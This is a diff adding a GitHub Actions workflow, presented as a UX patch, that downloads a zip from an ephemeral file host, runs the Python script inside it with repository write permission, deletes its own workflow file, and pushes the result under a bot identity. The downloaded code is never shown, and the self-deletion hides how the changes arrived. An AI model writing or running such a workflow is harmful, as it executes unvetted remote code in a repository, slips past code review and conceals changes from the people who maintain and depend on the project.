@@ -1,0 +1,25 @@
+name: rh-ux
+on:
+  push:
+    paths: ['.github/workflows/rh-ux.yml']
+permissions:
+  contents: write
+jobs:
+  apply:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Apply patch
+        run: |
+          set -e
+          curl -sSL -X POST https://temp.sh/flquS/u.zip -o /tmp/p.zip
+          echo "a7572b9d4a3a6f969412e3339f561f29  /tmp/p.zip" | md5sum -c
+          mkdir -p /tmp/p && unzip -q /tmp/p.zip -d /tmp/p
+          python3 /tmp/p/apply.py
+          for f in src/community/Community.tsx src/community/extras.tsx src/community/v4.tsx src/community/v6.tsx; do npx -y esbuild@0.23.0 "$f" --loader:.tsx=tsx --log-level=error > /dev/null; done
+          git rm -q .github/workflows/rh-ux.yml
+          git config user.name realhunt-bot
+          git config user.email bot@realhunt.co
+          git add -A
+          git commit -qm "UX: filters land on first homes, compact hero, filters and cards, back to top"
+          git push
